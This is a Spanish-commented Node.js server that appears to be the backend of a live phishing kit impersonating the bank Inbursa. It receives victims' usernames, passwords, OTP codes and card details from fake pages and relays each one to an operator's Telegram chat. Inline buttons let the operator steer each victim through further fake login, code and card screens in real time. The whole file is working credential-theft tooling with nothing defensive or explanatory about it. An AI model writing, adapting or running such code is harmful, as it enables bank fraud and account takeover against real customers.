require('dotenv').config();
const express = require('express');
const app = express();
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const bodyParser = require('body-parser');

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const telegramChatId = process.env.TELEGRAM_CHAT_ID;
const activeSockets = new Map();

app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

io.on('connection', (socket) => {
  console.log('🧠 Usuario conectado:', socket.id);

  // Formulario de errorlogo.html (Recibe usuario y contraseña)
  socket.on('errorlogoForm', ({ usuario, contrasena, sessionId }) => {
    activeSockets.set(sessionId, socket);

    // Enviar los datos recibidos a Telegram
    const mensaje = `⚠️ Nuevo intento fallido detectado INBURSA RICKSAN:\n\n📧 Usuario: ${usuario}\n🔑 Clave: ${contrasena}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🔁 OTP', callback_data: `otp_${sessionId}` },
            { text: '🚫 Error logo', callback_data: `errorlogo_${sessionId}` },
            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
          ]
        ]
      }
    };

    // Enviar mensaje a Telegram
    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Responder a la interacción de Telegram
  socket.on('redirigir', ({ url, sessionId }) => {
    const socketTarget = activeSockets.get(sessionId);
    if (socketTarget) {
      socketTarget.emit('redirigir', url);
    }
  });

  // Código OTP (bienvenido.html)
  socket.on('codigoIngresado', ({ codigo, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `🔍 El usuario ingresó el siguiente código INBURSA RICKSAN:\n\n🧾 Código: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '❌ Error de código', callback_data: `error_${sessionId}` },
            { text: '✅ Finalizar', callback_data: `finalizar_${sessionId}` },
            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // OTP reintento (denegado.html)
  socket.on('otpIngresado', ({ codigo, sessionId }) => {
    activeSockets.set(sessionId, socket);

    const mensaje = `📨 Reintento desde pantalla de error INBURSA RICKSAN:\n\n🧾 Nuevo código OTP: ${codigo}`;
    const botones = {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '✅ Finalizar', callback_data: `otpFinalizar_${sessionId}` },
            { text: '❌ Error de OTP', callback_data: `otpError_${sessionId}` },
            { text: '🟨 TC', callback_data: `tc_${sessionId}` }
          ]
        ]
      }
    };

    bot.sendMessage(telegramChatId, mensaje, botones);
  });

  // Reconexión por sessionId
  socket.on('reconectar', (sessionId) => {
    activeSockets.set(sessionId, socket);
  });

  // Redirección solicitada desde botones en el HTML
  socket.on("redirigir", ({ url, sessionId }) => {
    const socketTarget = activeSockets.get(sessionId);
    if (socketTarget) {
      socketTarget.emit("redirigir", url);
    }
  });
});

// Respuesta a botones desde Telegram
bot.on('callback_query', (query) => {
  const data = query.data;
  const chatId = query.message.chat.id;
  const callbackId = query.id;

  bot.answerCallbackQuery(callbackId);

  const sessionId = data.split('_')[1];
  const socket = activeSockets.get(sessionId);

  if (!socket) {
    bot.sendMessage(chatId, '⚠️ No se encontró la sesión del usuario.');
    return;
  }

  if (data.startsWith('aprobado_') || data.startsWith('rechazado_')) {
    const decision = data.startsWith('aprobado_') ? 'aprobado' : 'rechazado';
    socket.emit('respuesta', decision);
    bot.sendMessage(chatId, decision === 'aprobado' ? '✅ Acceso aprobado.' : '❌ Acceso denegado.');
  } else if (data.startsWith('error_') || data.startsWith('finalizar_')) {
    const decision = data.startsWith('error_') ? 'error' : 'finalizar';
    socket.emit('respuestaCodigo', decision);
    bot.sendMessage(chatId, decision === 'error' ? '⚠️ Código incorrecto.' : '✅ Finalizando proceso...');
  } else if (data.startsWith('otpFinalizar_') || data.startsWith('otpError_')) {
    const decision = data.startsWith('otpFinalizar_') ? 'finalizar' : 'otp_error';
    socket.emit('respuestaOtp', decision);
    bot.sendMessage(chatId, decision === 'finalizar' ? '✅ Proceso finalizado.' : '❌ Código OTP inválido nuevamente.');
  } else if (data.startsWith('otp_') || data.startsWith('errorlogo_')) {
    const decision = data.startsWith('otp_') ? 'otp' : 'error_logo';
    socket.emit('respuestaErrorLogo', decision);

    // Cambié aquí, se redirige correctamente a 'errorlogo.html' en vez de 'denegado.html'
    bot.sendMessage(chatId, decision === 'otp' ? '📲 Redirigiendo a ingreso de código.' : '🚫 Error logo, reenviando a errorlogo.html.');
    if (decision === 'error_logo') {
      socket.emit('redirigir', 'errorlogo.html'); // Redirigir a la página errorlogo.html
    }
  } else if (data.startsWith('errortc_') || data.startsWith('finalizarTarjeta_') || data.startsWith('tc_')) {
    const action = data.split('_')[0];

    if (action === 'errortc') {
      socket.emit('redirigir', 'errortc.html');
      bot.sendMessage(chatId, '🚫 Error TC — redirigiendo...');
    } else if (action === 'finalizarTarjeta') {
      socket.emit('redirigir', 'https://www.google.com/');
      bot.sendMessage(chatId, '✅ Finalizando...');
    } else if (action === 'tc') {
      socket.emit('redirigir', 'card.html');
      bot.sendMessage(chatId, '🟨 Redirigiendo a TC...');
    }
  }

  activeSockets.delete(sessionId);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀 Servidor escuchando en el puerto ${PORT}`);
});
